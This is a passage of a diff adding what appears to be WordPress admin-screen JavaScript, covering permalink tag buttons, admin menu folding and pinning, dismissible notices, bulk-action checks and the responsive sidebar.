+	$availableStructureTags.each( function() {
+		changeStructureTagButtonState( $( this ) );
+	} );
+} );
+
+$availableStructureTags.on( 'click', function() {
+	var permalinkStructureValue = $permalinkStructure.val(),
+	    selectionStart          = $permalinkStructure[ 0 ].selectionStart,
+	    selectionEnd            = $permalinkStructure[ 0 ].selectionEnd,
+	    textToAppend            = $( this ).text().trim(),
+	    textToAnnounce,
+	    newSelectionStart;
+
+	if ( $( this ).hasClass( 'active' ) ) {
+		textToAnnounce = $( this ).attr( 'data-removed' );
+	} else {
+		textToAnnounce = $( this ).attr( 'data-added' );
+	}
+
+	// Remove structure tag if already part of the structure.
+	if ( -1 !== permalinkStructureValue.indexOf( textToAppend ) ) {
+		permalinkStructureValue = permalinkStructureValue.replace( textToAppend + '/', '' );
+
+		$permalinkStructure.val( '/' === permalinkStructureValue ? '' : permalinkStructureValue );
+
+		// Announce change to screen readers.
+		$( '#custom_selection_updated' ).text( textToAnnounce );
+
+		// Disable button.
+		changeStructureTagButtonState( $( this ) );
+
+		return;
+	}
+
+	// Input field never had focus, move selection to end of input.
+	if ( ! permalinkStructureFocused && 0 === selectionStart && 0 === selectionEnd ) {
+		selectionStart = selectionEnd = permalinkStructureValue.length;
+	}
+
+	$permalinkCustomSelection.prop( 'checked', true );
+
+	// Prepend and append slashes if necessary.
+	if ( '/' !== permalinkStructureValue.substr( 0, selectionStart ).substr( -1 ) ) {
+		textToAppend = '/' + textToAppend;
+	}
+
+	if ( '/' !== permalinkStructureValue.substr( selectionEnd, 1 ) ) {
+		textToAppend = textToAppend + '/';
+	}
+
+	// Insert structure tag at the specified position.
+	$permalinkStructure.val( permalinkStructureValue.substr( 0, selectionStart ) + textToAppend + permalinkStructureValue.substr( selectionEnd ) );
+
+	// Announce change to screen readers.
+	$( '#custom_selection_updated' ).text( textToAnnounce );
+
+	// Disable button.
+	changeStructureTagButtonState( $( this ) );
+
+	// If input had focus give it back with cursor right after appended text.
+	if ( permalinkStructureFocused && $permalinkStructure[0].setSelectionRange ) {
+		newSelectionStart = ( permalinkStructureValue.substr( 0, selectionStart ) + textToAppend ).length;
+		$permalinkStructure[0].setSelectionRange( newSelectionStart, newSelectionStart );
+		$permalinkStructure.trigger( 'focus' );
+	}
+} );
+
+$( function() {
+	var checks, first, last, checked, sliced, mobileEvent, transitionTimeout, focusedRowActions,
+		lastClicked = false,
+		pageInput = $('input.current-page'),
+		currentPage = pageInput.val(),
+		isIOS = /iPhone|iPad|iPod/.test( navigator.userAgent ),
+		isAndroid = navigator.userAgent.indexOf( 'Android' ) !== -1,
+		$adminMenuWrap = $( '#adminmenuwrap' ),
+		$wpwrap = $( '#wpwrap' ),
+		$adminmenu = $( '#adminmenu' ),
+		$overlay = $( '#wp-responsive-overlay' ),
+		$toolbar = $( '#wp-toolbar' ),
+		$toolbarPopups = $toolbar.find( 'a[aria-haspopup="true"]' ),
+		$sortables = $('.meta-box-sortables'),
+		wpResponsiveActive = false,
+		$adminbar = $( '#wpadminbar' ),
+		lastScrollPosition = 0,
+		pinnedMenuTop = false,
+		pinnedMenuBottom = false,
+		menuTop = 0,
+		menuState,
+		menuIsPinned = false,
+		height = {
+			window: $window.height(),
+			wpwrap: $wpwrap.height(),
+			adminbar: $adminbar.height(),
+			menu: $adminMenuWrap.height()
+		},
+		$headerEnd = $( '.wp-header-end' );
+
+	/**
+	 * Makes the fly-out submenu header clickable, when the menu is folded.
+	 *
+	 * @param {Event} e The event object.
+	 *
+	 * @return {void}
+	 */
+	$adminmenu.on('click.wp-submenu-head', '.wp-submenu-head', function(e){
+		$(e.target).parent().siblings('a').get(0).click();
+	});
+
+	/**
+	 * Collapses the admin menu.
+	 *
+	 * @return {void}
+	 */
+	$( '#collapse-button' ).on( 'click.collapse-menu', function() {
+		var viewportWidth = getViewportWidth() || 961;
+
+		// Reset any compensation for submenus near the bottom of the screen.
+		$('#adminmenu div.wp-submenu').css('margin-top', '');
+
+		if ( viewportWidth <= 960 ) {
+			if ( $body.hasClass('auto-fold') ) {
+				$body.removeClass('auto-fold').removeClass('folded');
+				setUserSetting('unfold', 1);
+				setUserSetting('mfold', 'o');
+				menuState = 'open';
+			} else {
+				$body.addClass('auto-fold');
+				setUserSetting('unfold', 0);
+				menuState = 'folded';
+			}
+		} else {
+			if ( $body.hasClass('folded') ) {
+				$body.removeClass('folded');
+				setUserSetting('mfold', 'o');
+				menuState = 'open';
+			} else {
+				$body.addClass('folded');
+				setUserSetting('mfold', 'f');
+				menuState = 'folded';
+			}
+		}
+
+		$document.trigger( 'wp-collapse-menu', { state: menuState } );
+	});
+
+	/**
+	 * Ensures an admin submenu is within the visual viewport.
+	 *
+	 * @since 4.1.0
+	 *
+	 * @param {jQuery} $menuItem The parent menu item containing the submenu.
+	 *
+	 * @return {void}
+	 */
+	function adjustSubmenu( $menuItem ) {
+		var bottomOffset, pageHeight, adjustment, theFold, menutop, wintop, maxtop,
+			$submenu = $menuItem.find( '.wp-submenu' );
+
+		menutop = $menuItem.offset().top;
+		wintop = $window.scrollTop();
+		maxtop = menutop - wintop - 30; // max = make the top of the sub almost touch admin bar.
+
+		bottomOffset = menutop + $submenu.height() + 1; // Bottom offset of the menu.
+		pageHeight = $wpwrap.height();                  // Height of the entire page.
+		adjustment = 60 + bottomOffset - pageHeight;
+		theFold = $window.height() + wintop - 50;       // The fold.
+
+		if ( theFold < ( bottomOffset - adjustment ) ) {
+			adjustment = bottomOffset - theFold;
+		}
+
+		if ( adjustment > maxtop ) {
+			adjustment = maxtop;
+		}
+
+		if ( adjustment > 1 && $('#wp-admin-bar-menu-toggle').is(':hidden') ) {
+			$submenu.css( 'margin-top', '-' + adjustment + 'px' );
+		} else {
+			$submenu.css( 'margin-top', '' );
+		}
+	}
+
+	if ( 'ontouchstart' in window || /IEMobile\/[1-9]/.test(navigator.userAgent) ) { // Touch screen device.
+		// iOS Safari works with touchstart, the rest work with click.
+		mobileEvent = isIOS ? 'touchstart' : 'click';
+
+		/**
+		 * Closes any open submenus when touch/click is not on the menu.
+		 *
+		 * @param {Event} e The event object.
+		 *
+		 * @return {void}
+		 */
+		$body.on( mobileEvent+'.wp-mobile-hover', function(e) {
+			if ( $adminmenu.data('wp-responsive') ) {
+				return;
+			}
+
+			if ( ! $( e.target ).closest( '#adminmenu' ).length ) {
+				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
+			}
+		});
+
+		/**
+		 * Handles the opening or closing the submenu based on the mobile click|touch event.
+		 *
+		 * @param {Event} event The event object.
+		 *
+		 * @return {void}
+		 */
+		$adminmenu.find( 'a.wp-has-submenu' ).on( mobileEvent + '.wp-mobile-hover', function( event ) {
+			var $menuItem = $(this).parent();
+
+			if ( $adminmenu.data( 'wp-responsive' ) ) {
+				return;
+			}
+
+			/*
+			 * Show the sub instead of following the link if:
+			 * 	- the submenu is not open.
+			 * 	- the submenu is not shown inline or the menu is not folded.
+			 */
+			if ( ! $menuItem.hasClass( 'opensub' ) && ( ! $menuItem.hasClass( 'wp-menu-open' ) || $menuItem.width() < 40 ) ) {
+				event.preventDefault();
+				adjustSubmenu( $menuItem );
+				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
+				$menuItem.addClass('opensub');
+			}
+		});
+	}
+
+	if ( ! isIOS && ! isAndroid ) {
+		$adminmenu.find( 'li.wp-has-submenu' ).hoverIntent({
+
+			/**
+			 * Opens the submenu when hovered over the menu item for desktops.
+			 *
+			 * @return {void}
+			 */
+			over: function() {
+				var $menuItem = $( this ),
+					$submenu = $menuItem.find( '.wp-submenu' ),
+					top = parseInt( $submenu.css( 'top' ), 10 );
+
+				if ( isNaN( top ) || top > -5 ) { // The submenu is visible.
+					return;
+				}
+
+				if ( $adminmenu.data( 'wp-responsive' ) ) {
+					// The menu is in responsive mode, bail.
+					return;
+				}
+
+				adjustSubmenu( $menuItem );
+				$adminmenu.find( 'li.opensub' ).removeClass( 'opensub' );
+				$menuItem.addClass( 'opensub' );
+			},
+
+			/**
+			 * Closes the submenu when no longer hovering the menu item.
+			 *
+			 * @return {void}
+			 */
+			out: function(){
+				if ( $adminmenu.data( 'wp-responsive' ) ) {
+					// The menu is in responsive mode, bail.
+					return;
+				}
+
+				$( this ).removeClass( 'opensub' ).find( '.wp-submenu' ).css( 'margin-top', '' );
+			},
+			timeout: 200,
+			sensitivity: 7,
+			interval: 90
+		});
+
+		/**
+		 * Opens the submenu on when focused on the menu item.
+		 *
+		 * @param {Event} event The event object.
+		 *
+		 * @return {void}
+		 */
+		$adminmenu.on( 'focus.adminmenu', '.wp-submenu a', function( event ) {
+			if ( $adminmenu.data( 'wp-responsive' ) ) {
+				// The menu is in responsive mode, bail.
+				return;
+			}
+
+			$( event.target ).closest( 'li.menu-top' ).addClass( 'opensub' );
+
+			/**
+			 * Closes the submenu on blur from the menu item.
+			 *
+			 * @param {Event} event The event object.
+			 *
+			 * @return {void}
+			 */
+		}).on( 'blur.adminmenu', '.wp-submenu a', function( event ) {
+			if ( $adminmenu.data( 'wp-responsive' ) ) {
+				return;
+			}
+
+			$( event.target ).closest( 'li.menu-top' ).removeClass( 'opensub' );
+
+			/**
+			 * Adjusts the size for the submenu.
+			 *
+			 * @return {void}
+			 */
+		}).find( 'li.wp-has-submenu.wp-not-current-submenu' ).on( 'focusin.adminmenu', function() {
+			adjustSubmenu( $( this ) );
+		});
+	}
+
+	/*
+	 * The `.below-h2` class is here just for backward compatibility with plugins
+	 * that are (incorrectly) using it. Do not use. Use `.inline` instead. See #34570.
+	 * If '.wp-header-end' is found, append the notices after it otherwise
+	 * after the first h1 or h2 heading found within the main content.
+	 */
+	if ( ! $headerEnd.length ) {
+		$headerEnd = $( '.wrap h1, .wrap h2' ).first();
+	}
+	$( 'div.updated, div.error, div.notice' ).not( '.inline, .below-h2' ).insertAfter( $headerEnd );
+
+	/**
+	 * Makes notices dismissible.
+	 *
+	 * @since 4.4.0
+	 *
+	 * @return {void}
+	 */
+	function makeNoticesDismissible() {
+		$( '.notice.is-dismissible' ).each( function() {
+			var $el = $( this ),
+				$button = $( '<button type="button" class="notice-dismiss"><span class="screen-reader-text"></span></button>' );
+
+			if ( $el.find( '.notice-dismiss' ).length ) {
+				return;
+			}
+
+			// Ensure plain text.
+			$button.find( '.screen-reader-text' ).text( __( 'Dismiss this notice.' ) );
+			$button.on( 'click.wp-dismiss-notice', function( event ) {
+				event.preventDefault();
+				$el.fadeTo( 100, 0, function() {
+					$el.slideUp( 100, function() {
+						$el.remove();
+					});
+				});
+			});
+
+			$el.append( $button );
+		});
+	}
+
+	$document.on( 'wp-updates-notice-added wp-plugin-install-error wp-plugin-update-error wp-plugin-delete-error wp-theme-install-error wp-theme-delete-error wp-notice-added', makeNoticesDismissible );
+
+	// Init screen meta.
+	screenMeta.init();
+
+	/**
+	 * Checks a checkbox.
+	 *
+	 * This event needs to be delegated. Ticket #37973.
+	 *
+	 * @return {boolean} Returns whether a checkbox is checked or not.
+	 */
+	$body.on( 'click', 'tbody > tr > .check-column :checkbox', function( event ) {
+		// Shift click to select a range of checkboxes.
+		if ( 'undefined' == event.shiftKey ) { return true; }
+		if ( event.shiftKey ) {
+			if ( !lastClicked ) { return true; }
+			checks = $( lastClicked ).closest( 'form' ).find( ':checkbox' ).filter( ':visible:enabled' );
+			first = checks.index( lastClicked );
+			last = checks.index( this );
+			checked = $(this).prop('checked');
+			if ( 0 < first && 0 < last && first != last ) {
+				sliced = ( last > first ) ? checks.slice( first, last ) : checks.slice( last, first );
+				sliced.prop( 'checked', function() {
+					if ( $(this).closest('tr').is(':visible') )
+						return checked;
+
+					return false;
+				});
+			}
+		}
+		lastClicked = this;
+
+		// Toggle the "Select all" checkboxes depending if the other ones are all checked or not.
+		var unchecked = $(this).closest('tbody').find('tr').find(':checkbox').filter(':visible:enabled').not(':checked');
+
+		/**
+		 * Determines if all checkboxes are checked.
+		 *
+		 * @return {boolean} Returns true if there are no unchecked checkboxes.
+		 */
+		$(this).closest('table').children('thead, tfoot').find(':checkbox').prop('checked', function() {
+			return ( 0 === unchecked.length );
+		});
+
+		return true;
+	});
+
+	/**
+	 * Controls all the toggles on bulk toggle change.
+	 *
+	 * When the bulk checkbox is changed, all the checkboxes in the tables are changed accordingly.
+	 * When the shift-button is pressed while changing the bulk checkbox the checkboxes in the table are inverted.
+	 *
+	 * This event needs to be delegated. Ticket #37973.
+	 *
+	 * @param {Event} event The event object.
+	 *
+	 * @return {boolean}
+	 */
+	$body.on( 'click.wp-toggle-checkboxes', 'thead .check-column :checkbox, tfoot .check-column :checkbox', function( event ) {
+		var $this = $(this),
+			$table = $this.closest( 'table' ),
+			controlChecked = $this.prop('checked'),
+			toggle = event.shiftKey || $this.data('wp-toggle');
+
+		$table.children( 'tbody' ).filter(':visible')
+			.children().children('.check-column').find(':checkbox')
+			/**
+			 * Updates the checked state on the checkbox in the table.
+			 *
+			 * @return {boolean} True checks the checkbox, False unchecks the checkbox.
+			 */
+			.prop('checked', function() {
+				if ( $(this).is(':hidden,:disabled') ) {
+					return false;
+				}
+
+				if ( toggle ) {
+					return ! $(this).prop( 'checked' );
+				} else if ( controlChecked ) {
+					return true;
+				}
+
+				return false;
+			});
+
+		$table.children('thead,  tfoot').filter(':visible')
+			.children().children('.check-column').find(':checkbox')
+
+			/**
+			 * Syncs the bulk checkboxes on the top and bottom of the table.
+			 *
+			 * @return {boolean} True checks the checkbox, False unchecks the checkbox.
+			 */
+			.prop('checked', function() {
+				if ( toggle ) {
+					return false;
+				} else if ( controlChecked ) {
+					return true;
+				}
+
+				return false;
+			});
+	});
+
+	/**
+	 * Marries a secondary control to its primary control.
+	 *
+	 * @param {jQuery} topSelector    The top selector element.
+	 * @param {jQuery} topSubmit      The top submit element.
+	 * @param {jQuery} bottomSelector The bottom selector element.
+	 * @param {jQuery} bottomSubmit   The bottom submit element.
+	 * @return {void}
+	 */
+	function marryControls( topSelector, topSubmit, bottomSelector, bottomSubmit ) {
+		/**
+		 * Updates the primary selector when the secondary selector is changed.
+		 *
+		 * @since 5.7.0
+		 *
+		 * @return {void}
+		 */
+		function updateTopSelector() {
+			topSelector.val($(this).val());
+		}
+		bottomSelector.on('change', updateTopSelector);
+
+		/**
+		 * Updates the secondary selector when the primary selector is changed.
+		 *
+		 * @since 5.7.0
+		 *
+		 * @return {void}
+		 */
+		function updateBottomSelector() {
+			bottomSelector.val($(this).val());
+		}
+		topSelector.on('change', updateBottomSelector);
+
+		/**
+		 * Triggers the primary submit when then secondary submit is clicked.
+		 *
+		 * @since 5.7.0
+		 *
+		 * @return {void}
+		 */
+		function triggerSubmitClick(e) {
+			e.preventDefault();
+			e.stopPropagation();
+
+			topSubmit.trigger('click');
+		}
+		bottomSubmit.on('click', triggerSubmitClick);
+	}
+
+	// Marry the secondary "Bulk actions" controls to the primary controls:
+	marryControls( $('#bulk-action-selector-top'), $('#doaction'), $('#bulk-action-selector-bottom'), $('#doaction2') );
+
+	// Marry the secondary "Change role to" controls to the primary controls:
+	marryControls( $('#new_role'), $('#changeit'), $('#new_role2'), $('#changeit2') );
+
+	var addAdminNotice = function( data ) {
+		var $notice = $( data.selector ),
+			$headerEnd = $( '.wp-header-end' ),
+			type,
+			dismissible,
+			$adminNotice;
+
+		delete data.selector;
+
+		dismissible = ( data.dismissible && data.dismissible === true ) ? ' is-dismissible' : '';
+		type        = ( data.type ) ? data.type : 'info';
+
+		$adminNotice = '<div id="' + data.id + '" class="notice notice-' + data.type + dismissible + '"><p>' + data.message + '</p></div>';
+
+		// Check if this admin notice already exists.
+		if ( ! $notice.length ) {
+			$notice = $( '#' + data.id );
+		}
+
+		if ( $notice.length ) {
+			$notice.replaceWith( $adminNotice );
+		} else if ( $headerEnd.length ) {
+			$headerEnd.after( $adminNotice );
+		} else {
+			if ( 'customize' === pagenow ) {
+				$( '.customize-themes-notifications' ).append( $adminNotice );
+			} else {
+				$( '.wrap' ).find( '> h1' ).after( $adminNotice );
+			}
+		}
+
+		$document.trigger( 'wp-notice-added' );
+	};
+
+	$( '.bulkactions' ).parents( 'form' ).on( 'submit', function( event ) {
+		var form = this,
+			submitterName = event.originalEvent && event.originalEvent.submitter ? event.originalEvent.submitter.name : false,
+			currentPageSelector = form.querySelector( '#current-page-selector' );
+
+		if ( currentPageSelector && currentPageSelector.defaultValue !== currentPageSelector.value ) {
+			return; // Pagination form submission.
+		}
+
+		// Observe submissions from posts lists for 'bulk_action' or users lists for 'new_role'.
+		var bulkFieldRelations = {
+			'bulk_action' : window.bulkActionObserverIds.bulk_action,
+			'changeit' : window.bulkActionObserverIds.changeit
+		};
+		if ( ! Object.keys( bulkFieldRelations ).includes( submitterName ) ) {
+			return;
+		}
+
+		var values = new FormData(form);
+		var value = values.get( bulkFieldRelations[ submitterName ] ) || '-1';
+
+		// Check that the action is not the default one.
+		if ( value !== '-1' ) {
+			// Check that at least one item is selected.
+			var itemsSelected = form.querySelectorAll( '.wp-list-table tbody .check-column input[type="checkbox"]:checked' );
+
+			if ( itemsSelected.length > 0 ) {
+				return;
+			}
+		}
+		event.preventDefault();
+		event.stopPropagation();
+		$( 'html, body' ).animate( { scrollTop: 0 } );
+
+		var errorMessage = __( 'Please select at least one item to perform this action on.' );
+		addAdminNotice( {
+			id: 'no-items-selected',
+			type: 'error',
+			message: errorMessage,
+			dismissible: true,
+		} );
+
+		wp.a11y.speak( errorMessage );
+	});
+
+	/**
+	 * Shows row actions on focus of its parent container element or any other elements contained within.
+	 *
+	 * @return {void}
+	 */
+	$( '#wpbody-content' ).on({
+		focusin: function() {
+			clearTimeout( transitionTimeout );
+			focusedRowActions = $( this ).find( '.row-actions' );
+			// transitionTimeout is necessary for Firefox, but Chrome won't remove the CSS class without a little help.
+			$( '.row-actions' ).not( this ).removeClass( 'visible' );
+			focusedRowActions.addClass( 'visible' );
+		},
+		focusout: function() {
+			// Tabbing between post title and .row-actions links needs a brief pause, otherwise
+			// the .row-actions div gets hidden in transit in some browsers (ahem, Firefox).
+			transitionTimeout = setTimeout( function() {
+				focusedRowActions.removeClass( 'visible' );
+			}, 30 );
+		}
+	}, '.table-view-list .has-row-actions' );
+
+	// Toggle list table rows on small screens.
+	$( 'tbody' ).on( 'click', '.toggle-row', function() {
+		$( this ).closest( 'tr' ).toggleClass( 'is-expanded' );
+	});
+
+	$('#default-password-nag-no').on( 'click', function() {
+		setUserSetting('default_password_nag', 'hide');
+		$('div.default-password-nag').hide();
+		return false;
+	});
+
+	/**
+	 * Handles tab keypresses in theme and plugin file editor textareas.
+	 *
+	 * @param {Event} e The event object.
+	 *
+	 * @return {void}
+	 */
+	$('#newcontent').on('keydown.wpevent_InsertTab', function(e) {
+		var el = e.target, selStart, selEnd, val, scroll, sel;
+
+		// After pressing escape key (keyCode: 27), the tab key should tab out of the textarea.
+		if ( e.keyCode == 27 ) {
+			// When pressing Escape: Opera 12 and 27 blur form fields, IE 8 clears them.
+			e.preventDefault();
+			$(el).data('tab-out', true);
+			return;
+		}
+
+		// Only listen for plain tab key (keyCode: 9) without any modifiers.
+		if ( e.keyCode != 9 || e.ctrlKey || e.altKey || e.shiftKey )
+			return;
+
+		// After tabbing out, reset it so next time the tab key can be used again.
+		if ( $(el).data('tab-out') ) {
+			$(el).data('tab-out', false);
+			return;
+		}
+
+		selStart = el.selectionStart;
+		selEnd = el.selectionEnd;
+		val = el.value;
+
+		// If any text is selected, replace the selection with a tab character.
+		if ( document.selection ) {
+			el.focus();
+			sel = document.selection.createRange();
+			sel.text = '\t';
+		} else if ( selStart >= 0 ) {
+			scroll = this.scrollTop;
+			el.value = val.substring(0, selStart).concat('\t', val.substring(selEnd) );
+			el.selectionStart = el.selectionEnd = selStart + 1;
+			this.scrollTop = scroll;
+		}
+
+		// Cancel the regular tab functionality, to prevent losing focus of the textarea.
+		if ( e.stopPropagation )
+			e.stopPropagation();
+		if ( e.preventDefault )
+			e.preventDefault();
+	});
+
+	// Reset page number variable for new filters/searches but not for bulk actions. See #17685.
+	if ( pageInput.length ) {
+
+		/**
+		 * Handles pagination variable when filtering the list table.
+		 *
+		 * Set the pagination argument to the first page when the post-filter form is submitted.
+		 * This happens when pressing the 'filter' button on the list table page.
+		 *
+		 * The pagination argument should not be touched when the bulk action dropdowns are set to do anything.
+		 *
+		 * The form closest to the pageInput is the post-filter form.
+		 *
+		 * @return {void}
+		 */
+		pageInput.closest('form').on( 'submit', function() {
+			/*
+			 * action = bulk action dropdown at the top of the table
+			 */
+			if ( $('select[name="action"]').val() == -1 && pageInput.val() == currentPage )
+				pageInput.val('1');
+		});
+	}
+
+	/**
+	 * Resets the bulk actions when the search button is clicked.
+	 *
+	 * @return {void}
+	 */
+	$('.search-box input[type="search"], .search-box input[type="submit"]').on( 'mousedown', function () {
+		$('select[name^="action"]').val('-1');
+	});
+
+	/**
+	 * Scrolls into view when focus.scroll-into-view is triggered.
+	 *
+	 * @param {Event} e The event object.
+	 *
+	 * @return {void}
+ 	 */
+	$('#contextual-help-link, #show-settings-link').on( 'focus.scroll-into-view', function(e){
+		if ( e.target.scrollIntoViewIfNeeded )
+			e.target.scrollIntoViewIfNeeded(false);
+	});
+
+	/**
+	 * Disables the submit upload buttons when no data is entered.
+	 *
+	 * @return {void}
+	 */
+	(function(){
+		var button, input, form = $('form.wp-upload-form');
+
+		// Exit when no upload form is found.
+		if ( ! form.length )
+			return;
+
+		button = form.find('input[type="submit"]');
+		input = form.find('input[type="file"]');
+
+		/**
+		 * Determines if any data is entered in any file upload input.
+		 *
+		 * @since 3.5.0
+		 *
+		 * @return {void}
+		 */
+		function toggleUploadButton() {
+			// When no inputs have a value, disable the upload buttons.
+			button.prop('disabled', '' === input.map( function() {
+				return $(this).val();
+			}).get().join(''));
+		}
+
+		// Update the status initially.
+		toggleUploadButton();
+		// Update the status when any file input changes.
+		input.on('change', toggleUploadButton);
+	})();
+
+	/**
+	 * Pins the menu while distraction-free writing is enabled.
+	 *
+	 * @param {Event} event Event data.
+	 *
+	 * @since 4.1.0
+	 *
+	 * @return {void}
+	 */
+	function pinMenu( event ) {
+		var windowPos = $window.scrollTop(),
+			resizing = ! event || event.type !== 'scroll';
+
+		if ( isIOS || $adminmenu.data( 'wp-responsive' ) ) {
+			return;
+		}
+
+		/*
+		 * When the menu is higher than the window and smaller than the entire page.
+		 * It should be adjusted to be able to see the entire menu.
+		 *
+		 * Otherwise it can be accessed normally.
+		 */
+		if ( height.menu + height.adminbar < height.window ||
+			height.menu + height.adminbar + 20 > height.wpwrap ) {
+			unpinMenu();
+			return;
+		}
+
+		menuIsPinned = true;
+
+		// If the menu is higher than the window, compensate on scroll.
+		if ( height.menu + height.adminbar > height.window ) {
+			// Check for overscrolling, this happens when swiping up at the top of the document in modern browsers.
+			if ( windowPos < 0 ) {
+				// Stick the menu to the top.
+				if ( ! pinnedMenuTop ) {
+					pinnedMenuTop = true;
+					pinnedMenuBottom = false;
+
+					$adminMenuWrap.css({
+						position: 'fixed',
+						top: '',
+						bottom: ''
+					});
+				}
+
+				return;
+			} else if ( windowPos + height.window > $document.height() - 1 ) {
+				// When overscrolling at the bottom, stick the menu to the bottom.
+				if ( ! pinnedMenuBottom ) {
+					pinnedMenuBottom = true;
+					pinnedMenuTop = false;
+
+					$adminMenuWrap.css({
+						position: 'fixed',
+						top: '',
+						bottom: 0
+					});
+				}
+
+				return;
+			}
+
+			if ( windowPos > lastScrollPosition ) {
+				// When a down scroll has been detected.
+
+				// If it was pinned to the top, unpin and calculate relative scroll.
+				if ( pinnedMenuTop ) {
+					pinnedMenuTop = false;
+					// Calculate new offset position.
+					menuTop = $adminMenuWrap.offset().top - height.adminbar - ( windowPos - lastScrollPosition );
+
+					if ( menuTop + height.menu + height.adminbar < windowPos + height.window ) {
+						menuTop = windowPos + height.window - height.menu - height.adminbar;
+					}
+
+					$adminMenuWrap.css({
+						position: 'absolute',
+						top: menuTop,
+						bottom: ''
+					});
+				} else if ( ! pinnedMenuBottom && $adminMenuWrap.offset().top + height.menu < windowPos + height.window ) {
+					// Pin it to the bottom.
+					pinnedMenuBottom = true;
+
+					$adminMenuWrap.css({
+						position: 'fixed',
+						top: '',
+						bottom: 0
+					});
+				}
+			} else if ( windowPos < lastScrollPosition ) {
+				// When a scroll up is detected.
+
+				// If it was pinned to the bottom, unpin and calculate relative scroll.
+				if ( pinnedMenuBottom ) {
+					pinnedMenuBottom = false;
+
+					// Calculate new offset position.
+					menuTop = $adminMenuWrap.offset().top - height.adminbar + ( lastScrollPosition - windowPos );
+
+					if ( menuTop + height.menu > windowPos + height.window ) {
+						menuTop = windowPos;
+					}
+
+					$adminMenuWrap.css({
+						position: 'absolute',
+						top: menuTop,
+						bottom: ''
+					});
+				} else if ( ! pinnedMenuTop && $adminMenuWrap.offset().top >= windowPos + height.adminbar ) {
+
+					// Pin it to the top.
+					pinnedMenuTop = true;
+
+					$adminMenuWrap.css({
+						position: 'fixed',
+						top: '',
+						bottom: ''
+					});
+				}
+			} else if ( resizing ) {
+				// Window is being resized.
+
+				pinnedMenuTop = pinnedMenuBottom = false;
+
+				// Calculate the new offset.
+				menuTop = windowPos + height.window - height.menu - height.adminbar - 1;
+
+				if ( menuTop > 0 ) {
+					$adminMenuWrap.css({
+						position: 'absolute',
+						top: menuTop,
+						bottom: ''
+					});
+				} else {
+					unpinMenu();
+				}
+			}
+		}
+
+		lastScrollPosition = windowPos;
+	}
+
+	/**
+	 * Determines the height of certain elements.
+	 *
+	 * @since 4.1.0
+	 *
+	 * @return {void}
+	 */
+	function resetHeights() {
+		height = {
+			window: $window.height(),
+			wpwrap: $wpwrap.height(),
+			adminbar: $adminbar.height(),
+			menu: $adminMenuWrap.height()
+		};
+	}
+
+	/**
+	 * Unpins the menu.
+	 *
+	 * @since 4.1.0
+	 *
+	 * @return {void}
+	 */
+	function unpinMenu() {
+		if ( isIOS || ! menuIsPinned ) {
+			return;
+		}
+
+		pinnedMenuTop = pinnedMenuBottom = menuIsPinned = false;
+		$adminMenuWrap.css({
+			position: '',
+			top: '',
+			bottom: ''
+		});
+	}
+
+	/**
+	 * Pins and unpins the menu when applicable.
+	 *
+	 * @since 4.1.0
+	 *
+	 * @return {void}
+	 */
+	function setPinMenu() {
+		resetHeights();
+
+		if ( $adminmenu.data('wp-responsive') ) {
+			$body.removeClass( 'sticky-menu' );
+			unpinMenu();
+		} else if ( height.menu + height.adminbar > height.window ) {
+			pinMenu();
+			$body.removeClass( 'sticky-menu' );
+		} else {
+			$body.addClass( 'sticky-menu' );
+			unpinMenu();
+		}
+	}
+
+	if ( ! isIOS ) {
+		$window.on( 'scroll.pin-menu', pinMenu );
+		$document.on( 'tinymce-editor-init.pin-menu', function( event, editor ) {
+			editor.on( 'wp-autoresize', resetHeights );
+		});
+	}
+
+	/**
+	 * Changes the sortables and responsiveness of metaboxes.
+	 *
+	 * @since 3.8.0
+	 *
+	 * @return {void}
+	 */
+	window.wpResponsive = {
+
+		/**
+		 * Initializes the wpResponsive object.
+		 *
+		 * @since 3.8.0
+		 *
+		 * @return {void}
+		 */
+		init: function() {
+			var self = this;
+
+			this.maybeDisableSortables = this.maybeDisableSortables.bind( this );
+
+			// Modify functionality based on custom activate/deactivate event.
+			$document.on( 'wp-responsive-activate.wp-responsive', function() {
+				self.activate();
+				self.toggleAriaHasPopup( 'add' );
+			}).on( 'wp-responsive-deactivate.wp-responsive', function() {
+				self.deactivate();
+				self.toggleAriaHasPopup( 'remove' );
+			});
+
+			$( '#wp-admin-bar-menu-toggle a' ).attr( 'aria-expanded', 'false' );
+
+			// Toggle sidebar when toggle is clicked.
+			$( '#wp-admin-bar-menu-toggle' ).on( 'click.wp-responsive', function( event ) {
+				event.preventDefault();
+
+				// Close any open toolbar submenus.
+				$adminbar.find( '.hover' ).removeClass( 'hover' );
+
+				$wpwrap.toggleClass( 'wp-responsive-open' );
+				if ( $wpwrap.hasClass( 'wp-responsive-open' ) ) {
+					$(this).find('a').attr( 'aria-expanded', 'true' );
+					$( '#adminmenu a:first' ).trigger( 'focus' );
+				} else {
+					$(this).find('a').attr( 'aria-expanded', 'false' );
+				}
+			} );
+
+			// Close sidebar when target moves outside of toggle and sidebar.
+			$( document ).on( 'click', function( event ) {
+				if ( ! $wpwrap.hasClass( 'wp-responsive-open' ) || ! document.hasFocus() ) {
+					return;
+				}
+
+				var focusIsInToggle  = $.contains( $( '#wp-admin-bar-menu-toggle' )[0], event.target );
+				var focusIsInSidebar = $.contains( $( '#adminmenuwrap' )[0], event.target );
+
+				if ( ! focusIsInToggle && ! focusIsInSidebar ) {
+					$( '#wp-admin-bar-menu-toggle' ).trigger( 'click.wp-responsive' );
+				}
+			} );
+
+			// Close sidebar when a keypress completes outside of toggle and sidebar.
+			$( document ).on( 'keyup', function( event ) {
+				var toggleButton   = $( '#wp-admin-bar-menu-toggle' )[0];
+				if ( ! $wpwrap.hasClass( 'wp-responsive-open' ) ) {
+				    return;
+				}
+				if ( 27 === event.keyCode ) {
+					$( toggleButton ).trigger( 'click.wp-responsive' );
+					$( toggleButton ).find( 'a' ).trigger( 'focus' );
+				} else {
+					if ( 9 === event.keyCode ) {
+						var sidebar        = $( '#adminmenuwrap' )[0];
+						var focusedElement = event.relatedTarget || document.activeElement;
+						// A brief delay is required to allow focus to switch to another element.
+						setTimeout( function() {
+							var focusIsInToggle  = $.contains( toggleButton, focusedElement );
+							var focusIsInSidebar = $.contains( sidebar, focusedElement );
+
+							if ( ! focusIsInToggle && ! focusIsInSidebar ) {
+								$( toggleButton ).trigger( 'click.wp-responsive' );
+							}
+						}, 10 );
+					}
+				}
+			});
+
+			// Add menu events.
+			$adminmenu.on( 'click.wp-responsive', 'li.wp-has-submenu > a', function( event ) {
+				if ( ! $adminmenu.data('wp-responsive') ) {
